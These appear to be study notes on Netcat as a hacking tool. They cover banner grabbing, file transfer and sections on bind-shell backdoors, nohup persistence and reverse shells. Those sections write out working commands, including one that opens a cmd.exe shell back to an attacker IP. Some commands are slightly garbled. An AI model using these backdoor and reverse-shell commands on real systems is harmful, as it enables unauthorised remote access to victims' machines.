
- its considered as Swiss Army knife of hacking tools
- Command prompt based
	- Originallly for unix/linux computers
	- You can also download a windows versions
- Works with both TCP/ UDP
- Can act as either client or server
	- The client is typically the attacker machine
	- The server is typically the compromised victim machine
- Basic Features
	- Port Scan/Banner grab
	- Act as a Trojan backdoor between hosts and ports
	- Relay / redirected / proxy between hosts and ports
	- Transfer data
	- Act as a one-shot server (such as a webserver)
	- Act as a temporary chat server
#### NETCAT MODES
- Client Mode
	- The client always initiates the connection to the listener
	- All the errors in client mode are put output as standard error
	- Client Mode requires the IP address and port of the listener
- Listener mode:
	- The listener is the server
	- It waits for a client to connect on its configured listening port
	- Its output can be standard output or a file
> A Netcat client can connect to a netcat listener

##### NETCAT SYNTAX
```
	nc [options] [target_systen] [remote_port]'
```
- -l : tells netcat to be in listen mode
- -u : shifts netcat from TCP (default) to udp mode
- -p : For the listener, this is the listened port
	- for the client this is source port
- -e : Tells what operation to perform after a successful connection
- -L : Creates a persistent listener (windows only)
- -wN : Defines the timeout value
	- for Example , w5 = wait for 5 seconds before timeout
- -v : Puts the listener in verbose mode.

##### TCP BANNER GRABBING
- Grab the banner of any TCP service running on a target
- Attempt to connect to each port in the configured range
- Provide verbose output
- Do not resolve names
- Wait no more than 1 second for the connection
- Send a blank string to this range of ports and print out any response received
```
echo “” | nc -v -n -w1 [TargetIPAddr] [startport]-[endport]
```

- PUSH A FILE FROM CLIENT TO LISTNER
```
Listner
\\ Listen on localport , store results in outfile  
nc -l -p [localport] > [outfile]


Client
\\ Push infile to TargetPadd on port:
nc -w3 [TargetIPAddress] [port] < [infile]
```

PULL A FILE FROM LISTNER TO CLIENT
```
Listener
\\ Listen on localport, prep to push infile
nc -l -p [localport] < [infile]

Client
Connect to TargetIPAddress on port and retrieve outfile
nc -w [TargetIPAddress] [Port] > [Outfile]

```

#### NETCAT CREATE A BACKDOOR
- Netcat’s most popular use by malicious users is to create a backdoor login shell
- When the client connects, a command prompt on the listener opens
- The attacker sees the command prompt via the Netcat session
- Note that –e is used to execute the action after the connection is established

```
nc -l -p 1234 -e cmd.exe
on client: nc <Listner IP> 1234
```

#### NETCAT CREATE a PERSISTENT Backdoor
- In Linux, a Netcat backdoor can be made persistent
- Even after the current logged out, the backdoor will keep running in background
- This can be achieved with the usage of the nohup command
- Create the connection as simple script on the listener
- On the listener
```
nc -l -p 1234 -e cmd.exe > runme.sh
chmod 555 runme.sh
nohup ./ runme.sh &
```

#### NETCA REVERSE SHELLS
- The attacker sends an exploit to the victim
	- The payload is a netcat command that will make a connection back to the attacker
- The victim makes an outbound connection past its firewall
	- This means the attackers does not have to contend with the victims firewall when using the backdoor
- The attacker must be listening for, and be able to accept, the reverse connection
```
\\on Attacker: 
nc -l -p 1234

\\on Victim: 
nc <attacker ip> 1234 -e cmd.exe
```



